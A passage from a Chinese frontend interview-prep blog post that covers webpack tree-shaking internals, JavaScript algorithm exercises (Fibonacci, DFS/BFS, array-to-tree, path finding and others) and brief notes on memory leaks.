插件</strong>回调；</li><li>FlagDependencyExportsPlugin 插件从 entry 开始读取 ModuleGraph 中存储的模块信息，遍历所有 module 对象，<strong>所有 ESM 风格的 export 语句都会记录在 ModuleGraph 体系内</strong>，后续操作就可以从 ModuleGraph 中直接读取出模块的导出值；</li></ul></li><li><strong>Seal 阶段，遍历 ModuleGraph 标记模块导出变量有没有被使用：</strong><ul><li>触发 compilation.hooks.optimizeDependencies 钩子，开始<strong>执行 FlagDependencyUsagePlugin 插件逻辑</strong>;</li><li>在 FlagDependencyUsagePlugin 插件中，从 entry 开始逐步<strong>遍历 ModuleGraph 存储的所有 module 对象</strong>；</li><li>遍历 module 对象对应的 exportInfo 数组，<strong>确定其对应的 dependency 对象有否被其它模块使用</strong>；</li><li><strong>被任意模块使用到的导出值</strong>，调用 exportInfo.setUsedConditionally 方法将其<strong>标记为已被使用</strong>；</li><li>exportInfo.setUsedConditionally 内部修改 exportInfo._usedInRuntime 属性，<strong>记录该导出被如何使用</strong>；</li></ul></li><li><strong>打包阶段根据导出值的使用情况生成不同的代码：</strong><ul><li>打包阶段，调用 HarmonyExportXXXDependency.Template.apply 方法生成代码；</li><li>在 apply 方法内，读取 ModuleGraph 中存储的 exportsInfo 信息，判断哪些导出值被使用，哪些未被使用；</li><li>对已经被使用及未被使用的导出值，分别创建对应的 HarmonyExportInitFragment 对象，保存到 initFragments 数组；</li><li>遍历 initFragments 数组，生成最终结果；</li></ul></li><li><strong>生成产物时，若变量没有被其它模块使用则删除对应的导出语句：</strong><ul><li>由 Terser、UglifyJS 等 DCE 工具“摇”掉这部分无效代码，构成完整的 Tree Shaking 操作</li></ul></li></ul><blockquote><p>webpack 不会对 dead code 进行删除，只是在 <code>__webpack_require__.d</code> 中不注册未使用的方法，是 Terser 将未使用的代码删除的。</p></blockquote><p><a href="https://juejin.cn/post/7002410645316436004">参考文章</a></p><h3 id="Webpack-的流程"><a href="#Webpack-的流程" class="headerlink" title="Webpack 的流程"></a>Webpack 的流程</h3><p><a href="https://mp.weixin.qq.com/s/SbJNbSVzSPSKBe2YStn2Zw">https://mp.weixin.qq.com/s/SbJNbSVzSPSKBe2YStn2Zw</a></p><h1 id="8-算法"><a href="#8-算法" class="headerlink" title="8. 算法"></a>8. 算法</h1><h3 id="斐波那契数列"><a href="#斐波那契数列" class="headerlink" title="斐波那契数列"></a>斐波那契数列</h3><p>斐波那契数，指的是这样一个数列：1、1、2、3、5、8、13、21、……在数学上，斐波那契数列以如下被以递归的方法定义：F0=0，F1=1，Fn=Fn-1+Fn-2（n&gt;=2，n∈N*），用文字来说，就是斐波那契数列由 0 和 1 开始，之后的斐波那契数列系数就由之前的两数相加。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fib</span>(<span class="params">num</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (num &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">fib</span>(num - <span class="number">1</span>) + <span class="title function_">fib</span>(num - <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">perfFib</span>(<span class="params">num</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> prev = <span class="number">0</span>,</span><br><span class="line">    cur = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; num - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="comment">// const temp = cur;</span></span><br><span class="line">    <span class="comment">// cur = prev + cur;</span></span><br><span class="line">    <span class="comment">// prev = temp;</span></span><br><span class="line">    [prev, cur] = [cur, prev + cur];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> cur;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>fib</code> 方法利用闭包方式实现，但是如果 <code>num</code> 值过大，会造成递归函数嵌套过深，导致堆债溢出。<code>perfFib</code> 方法不使用递归实现可以避免堆栈溢出问题。</p><h3 id="深度优先-amp-广度优先"><a href="#深度优先-amp-广度优先" class="headerlink" title="深度优先 &amp; 广度优先"></a>深度优先 &amp; 广度优先</h3><p>深度优先：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">dfs</span> = (<span class="params">node, nodeList = []</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (node !== <span class="literal">null</span>) &#123;</span><br><span class="line">    nodeList.<span class="title function_">push</span>(node);</span><br><span class="line">    <span class="keyword">let</span> children = node.<span class="property">children</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; children.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      <span class="title function_">dfs</span>(children[i], nodeList);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> nodeList;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>广度优先：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">bfs</span> = (<span class="params">node</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> nodes = [];</span><br><span class="line">  <span class="keyword">let</span> stack = [];</span><br><span class="line">  <span class="keyword">if</span> (node) &#123;</span><br><span class="line">    stack.<span class="title function_">push</span>(node);</span><br><span class="line">    <span class="keyword">while</span> (stack.<span class="property">length</span>) &#123;</span><br><span class="line">      <span class="keyword">let</span> item = stack.<span class="title function_">shift</span>();</span><br><span class="line">      nodes.<span class="title function_">push</span>(item);</span><br><span class="line">      <span class="comment">// 队列，先进先出</span></span><br><span class="line">      <span class="comment">// nodes = [] stack = [parent]</span></span><br><span class="line">      <span class="comment">// nodes = [parent] stack = [child1,child2,child3]</span></span><br><span class="line">      <span class="comment">// nodes = [parent, child1] stack = [child2,child3,child1-1,child1-2]</span></span><br><span class="line">      <span class="comment">// nodes = [parent,child1,child2]</span></span><br><span class="line">      <span class="keyword">let</span> children = item.<span class="property">children</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; children.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        stack.<span class="title function_">push</span>(children[i]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> nodes;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="扁平化数组"><a href="#扁平化数组" class="headerlink" title="扁平化数组"></a>扁平化数组</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">flat</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> [].<span class="title function_">concat</span>(</span><br><span class="line">    ...arr.<span class="title function_">map</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(item) ? <span class="title function_">flat</span>(item) : [item]))</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="求连续"><a href="#求连续" class="headerlink" title="求连续"></a>求连续</h3><p>随机生成一个长度为 10 的整数类型的数组，例如 <code>[2, 10, 3, 4, 5, 11, 10, 11, 20]</code>，将其排列成一个新数组，要求新数组形式如下，例如 <code>[[2, 3, 4, 5], [10, 11], [20]]</code>。</p><p>思路：对目标数组进行去重和排序后，遍历目标数组，在每次遍历时取结果数组 <code>acc</code> 的最后一位 <code>lastArr</code>（这是排的原因）及其最后一个元素 <code>lastVal</code> ，将当前项 <code>cur</code> 与其进行对比，如果紧邻则将其推入 <code>lastArr</code> 否则，向 <code>acc</code> 中新增一个元素。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">formArray</span>(<span class="params">arr: any[]</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> sortedArr = <span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="keyword">new</span> <span class="title class_">Set</span>(arr)).<span class="title function_">sort</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sortedArr.<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc, cur</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> lastArr = acc.<span class="title function_">slice</span>().<span class="title function_">pop</span>() || [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> lastVal = lastArr.<span class="title function_">slice</span>().<span class="title function_">pop</span>();</span><br><span class="line">    <span class="keyword">if</span> (lastVal != <span class="literal">null</span> &amp;&amp; cur - lastVal === <span class="number">1</span>) &#123;</span><br><span class="line">      lastArr.<span class="title function_">push</span>(cur);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      acc.<span class="title function_">push</span>([cur]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> acc;</span><br><span class="line">  &#125;, []);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串匹配"><a href="#字符串匹配" class="headerlink" title="字符串匹配"></a>字符串匹配</h3><p>实现一个字符串匹配算法，从长度为 n 的字符串 S 中，查找是否存在字符串 T，T 的长度是 m，若存在返回所在位置。</p><p>使用正则表达式 match：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fucntion <span class="title function_">matchStr</span>(<span class="params">str, targetStr</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> str.<span class="title function_">match</span>(<span class="keyword">new</span> <span class="title class_">RegExp</span>(targetStr))?.<span class="property">index</span> ?? -<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>遍历字符串：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">find</span> = (<span class="params">S, T</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (S.<span class="property">length</span> &lt; T.<span class="property">length</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; S.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (S.<span class="title function_">slice</span>(i, i + T.<span class="property">length</span>) === T) <span class="keyword">return</span> i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="移动零"><a href="#移动零" class="headerlink" title="移动零"></a>移动零</h3><p>给定一个数组 nums，编写一个函数将所有 0 移动到数组的末尾，同时保持非零元素的相对顺序。</p><p>示例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: [0,1,0,3,12]</span><br><span class="line">输出: [1,3,12,0,0]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>说明:</p><ol><li>必须在原数组上操作，不能拷贝额外的数组。</li><li>尽量减少操作次数。</li></ol><p>需要注意数组塌陷，并且不能遍历到已经移动到尾部的 0。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sortZero</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> zeroCount = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span> - zeroCount; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr[i] === <span class="number">0</span>) &#123;</span><br><span class="line">      arr.<span class="title function_">splice</span>(i, <span class="number">1</span>);</span><br><span class="line">      arr.<span class="title function_">push</span>(<span class="number">0</span>);</span><br><span class="line">      i--;</span><br><span class="line">      zeroCount++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数组转树"><a href="#数组转树" class="headerlink" title="数组转树"></a>数组转树</h3><p>以下数据结构中，id 代表部门编号，name 是部门名称，parentId 是父部门编号，为 0 代表一级部门，现在要求实现一个 convert 方法，把原始 list 转换成树形结构，parentId 为多少就挂载在该 id 的属性 children 数组下，结构如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原始 list 如下</span></span><br><span class="line"><span class="keyword">let</span> list =[</span><br><span class="line">    &#123;<span class="attr">id</span>:<span class="number">1</span>,<span class="attr">name</span>:<span class="string">&#x27;部门A&#x27;</span>,<span class="attr">parentId</span>:<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">id</span>:<span class="number">2</span>,<span class="attr">name</span>:<span class="string">&#x27;部门B&#x27;</span>,<span class="attr">parentId</span>:<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">id</span>:<span class="number">3</span>,<span class="attr">name</span>:<span class="string">&#x27;部门C&#x27;</span>,<span class="attr">parentId</span>:<span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">id</span>:<span class="number">4</span>,<span class="attr">name</span>:<span class="string">&#x27;部门D&#x27;</span>,<span class="attr">parentId</span>:<span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">id</span>:<span class="number">5</span>,<span class="attr">name</span>:<span class="string">&#x27;部门E&#x27;</span>,<span class="attr">parentId</span>:<span class="number">2</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">id</span>:<span class="number">6</span>,<span class="attr">name</span>:<span class="string">&#x27;部门F&#x27;</span>,<span class="attr">parentId</span>:<span class="number">3</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">id</span>:<span class="number">7</span>,<span class="attr">name</span>:<span class="string">&#x27;部门G&#x27;</span>,<span class="attr">parentId</span>:<span class="number">2</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">id</span>:<span class="number">8</span>,<span class="attr">name</span>:<span class="string">&#x27;部门H&#x27;</span>,<span class="attr">parentId</span>:<span class="number">4</span>&#125;</span><br><span class="line">];</span><br><span class="line"><span class="keyword">const</span> result = <span class="title function_">convert</span>(list, ...);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转换后的结果如下</span></span><br><span class="line"><span class="keyword">let</span> result = [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;部门A&#x27;</span>,</span><br><span class="line">      <span class="attr">parentId</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">children</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">id</span>: <span class="number">3</span>,</span><br><span class="line">          <span class="attr">name</span>: <span class="string">&#x27;部门C&#x27;</span>,</span><br><span class="line">          <span class="attr">parentId</span>: <span class="number">1</span>,</span><br><span class="line">          <span class="attr">children</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="attr">id</span>: <span class="number">6</span>,</span><br><span class="line">              <span class="attr">name</span>: <span class="string">&#x27;部门F&#x27;</span>,</span><br><span class="line">              <span class="attr">parentId</span>: <span class="number">3</span></span><br><span class="line">            &#125;, &#123;</span><br><span class="line">              <span class="attr">id</span>: <span class="number">16</span>,</span><br><span class="line">              <span class="attr">name</span>: <span class="string">&#x27;部门L&#x27;</span>,</span><br><span class="line">              <span class="attr">parentId</span>: <span class="number">3</span></span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">id</span>: <span class="number">4</span>,</span><br><span class="line">          <span class="attr">name</span>: <span class="string">&#x27;部门D&#x27;</span>,</span><br><span class="line">          <span class="attr">parentId</span>: <span class="number">1</span>,</span><br><span class="line">          <span class="attr">children</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="attr">id</span>: <span class="number">8</span>,</span><br><span class="line">              <span class="attr">name</span>: <span class="string">&#x27;部门H&#x27;</span>,</span><br><span class="line">              <span class="attr">parentId</span>: <span class="number">4</span></span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">  ···</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>如果从上到下生成树，那么将会多次遍历原数组，时间复杂度为 O(2n)，要想做到时间复杂度为 O(1) 那么整体思想就是去遍历一遍原数组在遍历的过程中去查找每个元素在树上的 parent，同时创建一个 map 来快速根据 parentId 来找到 parent 节点：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">convert</span>(<span class="params">list</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> res = [];</span><br><span class="line">  <span class="keyword">const</span> map = list.<span class="title function_">reduce</span>(<span class="function">(<span class="params">res, v</span>) =&gt;</span> ((res[v.<span class="property">id</span>] = v), res), &#123;&#125;);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> list) &#123;</span><br><span class="line">    <span class="keyword">if</span> (item.<span class="property">parentId</span> === <span class="number">0</span>) &#123;</span><br><span class="line">      res.<span class="title function_">push</span>(item);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (item.<span class="property">parentId</span> <span class="keyword">in</span> map) &#123;</span><br><span class="line">      <span class="keyword">const</span> parent = map[item.<span class="property">parentId</span>];</span><br><span class="line">      parent.<span class="property">children</span> = parent.<span class="property">children</span> || [];</span><br><span class="line">      parent.<span class="property">children</span>.<span class="title function_">push</span>(item);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="路径查找"><a href="#路径查找" class="headerlink" title="路径查找"></a>路径查找</h3><p>有一个树形结构的数据，要求给出一个节点的 id，输出这个节点在树上的路径：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> data = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;test1&quot;</span>,</span><br><span class="line">    <span class="attr">children</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="string">&quot;11&quot;</span>,</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;test11&quot;</span>,</span><br><span class="line">        <span class="attr">children</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="string">&quot;111&quot;</span>,</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;test111&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="string">&quot;112&quot;</span>,</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;test112&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="string">&quot;12&quot;</span>,</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;test12&quot;</span>,</span><br><span class="line">        <span class="attr">children</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="string">&quot;121&quot;</span>,</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;test121&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="string">&quot;122&quot;</span>,</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;test122&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findPath</span>(<span class="params">data, targetVal, path = []</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> item = data[i];</span><br><span class="line">    <span class="comment">// 记录当前的路径</span></span><br><span class="line">    path.<span class="title function_">push</span>(item.<span class="property">id</span>);</span><br><span class="line">    <span class="comment">// dfs</span></span><br><span class="line">    <span class="keyword">if</span> (item.<span class="property">children</span> &amp;&amp; item.<span class="property">children</span>.<span class="property">length</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> findTarget = <span class="title function_">findPath</span>(item.<span class="property">children</span>, targetVal, path);</span><br><span class="line">      <span class="comment">// 找到目标时跳出递归</span></span><br><span class="line">      <span class="keyword">if</span> (findTarget) &#123;</span><br><span class="line">        <span class="keyword">return</span> findTarget;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (item.<span class="property">id</span> === targetVal) &#123;</span><br><span class="line">      <span class="comment">// 找到目标时跳出当前循环</span></span><br><span class="line">      <span class="keyword">return</span> path.<span class="title function_">slice</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 回溯时要 pop 出当前的元素，让兄弟节点使用已有的路径</span></span><br><span class="line">    path.<span class="title function_">pop</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">findPath</span>(data, <span class="string">&quot;122&quot;</span>)); <span class="comment">// [ &#x27;1&#x27;, &#x27;12&#x27;, &#x27;122&#x27; ]</span></span><br></pre></td></tr></table></figure><h3 id="递归反转字符串"><a href="#递归反转字符串" class="headerlink" title="递归反转字符串"></a>递归反转字符串</h3><p>用 JavaScript 写一个函数，输入 int 型，返回整数逆序后的字符串。如：输入整型 1234，返回字符串“4321”。要求必须使用递归函数调用，不能用全局变量，输入函数必须只有一个参数传入，必须返回字符串。</p><p>解析：将数字拆解为左右两个字符串，如 <code>1234</code> 拆解为 <code>1</code> 和 <code>234</code>，让后将两个字符串调换位置，同时对 <code>234</code> 字符串进行递归调用当前函数，当处理的字符串只有一个字符时跳出递归。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">reverseNum</span>(<span class="params">num</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> numStr = <span class="string">&quot;&quot;</span> + num;</span><br><span class="line">  <span class="keyword">if</span> (numStr.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> numStr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> left = numStr.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">const</span> right = numStr.<span class="title function_">slice</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">reverseNum</span>(right) + left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 <code>reverseNum</code> 递归时必须接收 Number，则可以使用除模运算来将数字 <code>1234</code> 拆解为 <code>123</code> 和 <code>4</code> 进行反转。</p><h1 id="9-其他"><a href="#9-其他" class="headerlink" title="9. 其他"></a>9. 其他</h1><h3 id="遇到过内存溢出吗，如何排查"><a href="#遇到过内存溢出吗，如何排查" class="headerlink" title="遇到过内存溢出吗，如何排查"></a>遇到过内存溢出吗，如何排查</h3><p>场景：</p><ul><li>Vue3 的 computed 占用 reactive 对象；</li><li>全局 pina 没有销毁；</li><li>在组件中创建了对象，但是在组建卸载时没有正确销毁，或者对象是异步创建的，组件销毁时执行的清理函数没有拿到创建的对象；</li></ul><p>什么情况会造成内存溢出：</p><ul><li>全局变量未删除</li><li>对象的循环引用</li></ul><h3 id="面试官反问"><a href="#面试官反问" class="headerlink" title="面试官反问"></a>面试官反问</h3><ul><li>您可以给我一些建议吗</li><li>您在团队里的职责是什么</li><li>团队使用的技术栈</li></ul>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
